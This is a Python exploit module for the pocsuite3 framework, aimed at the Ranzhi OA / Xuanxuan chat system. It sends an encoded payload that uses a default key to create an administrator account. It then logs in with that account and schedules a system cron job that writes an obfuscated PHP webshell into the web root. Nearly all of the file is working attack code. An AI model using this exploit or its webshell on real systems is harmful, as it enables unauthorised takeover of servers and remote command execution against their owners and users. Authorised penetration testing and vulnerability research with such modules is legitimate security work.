#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/2/28 1:38 PM
# @Author  : w8ay
# @File    : ramzhi_administrator.py
import base64

import requests
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, logger
from pocsuite3.lib.core.common import get_md5
from pocsuite3.lib.utils import get_middle_text


class DemoPOC(POCBase):
    vulID = '00000'  # ssvid
    version = '1.0'
    author = ['chenghs@knownsec.com']
    vulDate = '2018-2-28'
    createDate = '2019-2-26'
    updateDate = '2019-2-25'
    references = ['']
    name = '然之协同喧喧聊天系统配置不当导致的命令执行'
    appPowerLink = 'https://xuan.im/'
    appName = 'ranzhi'
    appVersion = 'oa<=4.6.1 xuanxuan<=1.3'
    vulType = 'rce'
    desc = '''2018年2月27日，漏洞发现者公开了漏洞的详情，攻击者可以通过默认的Key来执行任意类任意方法，可导致前台添加管理员，严重者可导致命令执行漏洞等。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            # "Cookie": "XDEBUG_SESSION=14791"
        }
        self.url = self.url.rstrip('/')

        base = 'CkKwDSZnBMMevnuri7IEgqSSuugS5vd2cmJ0ByV6juQG0ODxwYv36elTFRpQovoNgqI/gE1ZpsfWElyh28WTg9lQ9YOTiCizJf3KGR5qQl5AIxO7Fxe2vjS4N+jBp2SxW0d2tCf74gAEcN8n5gI3MVqXS1wUaKIMrGzocWz8/ENwvuGmuAN7CsI6bFrGTs1LSRu6f1LReIR0RAMPUh+0sVE5AXULjYGprmEFxZob6dQ6JxAR1Ley99NijHMktkfbt2vYTxQm8iJsRNUxmg9qYVTRjZm1hpjrpnGOIoWi0AcXmXRBbwjp/hCyCZPHn8doaVa2ztTvyHodw1TI/dXqig=='
        encrypted_text = base64.b64decode(base)

        r = requests.post(self.url + "/xuanxuan.php",
                          data=encrypted_text, headers=headers)

        if r.status_code == 200 and r.text.strip() == '':
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = "test"
            result['AdminInfo']['Password'] = "test1234"

        return self.parse_output(result)

    def _attack(self):
        self._verify()
        result = {}
        # 使用该账号登陆

        # 发送写文件任务计划
        headers = {
            "Cookie": "XDEBUG_SESSION=12388"
        }

        with requests.session() as req:
            # get random
            r = req.get(self.url + "/sys/index.php?m=user&f=login")
            random = get_middle_text(r.text, 'v.random = "', '";</script>')
            if not random:
                return
            logger.info("get random key:" + random)
            account = "test"
            origin_password = "test1234"
            # md5(md5(md5($('#password').val()) + $('#account').val()) + v.random);
            password = get_md5(get_md5(get_md5(origin_password) + account) + random)
            rawPassword = get_md5(origin_password)
            logger.info("calculate origin password:" + rawPassword)
            data = {
                "account": "test",
                "password": password,
                "referer": self.url + "/sys/index.php?entryID=superadmin&entryUrl=%2Fsys%2Findex.php%3Fm%3Dcron%26f%3Dindex",
                "rawPassword": rawPassword,
                "keepLogin": "false",
            }
            r = req.post(self.url + "/sys/index.php?m=user&f=login", data=data)
            php_webshell = '''<?php \$_='ass'.'e'.'r'.'t';\$_(\$_POST[c]);?>'''
            data = {
                "m": "*",
                "h": "*",
                "dom": "*",
                "mon": "*",
                "dow": "*",
                "command": 'echo "{}" > ../../../www/c.php'.format(php_webshell),
                "remark": "test",
                "type": "system",
            }
            r = req.post(
                self.url + "/sys/index.php?m=cron&f=create", data=data)
            if "<script>alert('Saved.')" in r.text:
                result['ShellInfo'] = {
                    "URL": self.url + "/c.php",
                    "Content": php_webshell
                }
            return result

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
